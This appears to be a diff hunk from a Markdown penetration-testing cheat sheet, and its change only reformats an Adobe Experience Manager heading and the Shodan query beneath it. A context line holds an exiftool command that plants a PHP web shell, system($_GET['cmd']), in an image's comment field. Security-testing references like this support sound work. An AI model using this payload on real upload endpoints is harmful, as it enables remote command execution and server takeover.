@@ -296,7 +296,9 @@ Registration
       exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' pic.jpg
       ```
 
-#### **Adobe Experience Manager (AEM) Configuration Testing**  Shodan Dork:
+#### **Adobe Experience Manager (AEM) Configuration Testing**
+
+Shodan Dork:
 
 `http.component:"Adobe Experience Manager"`
 
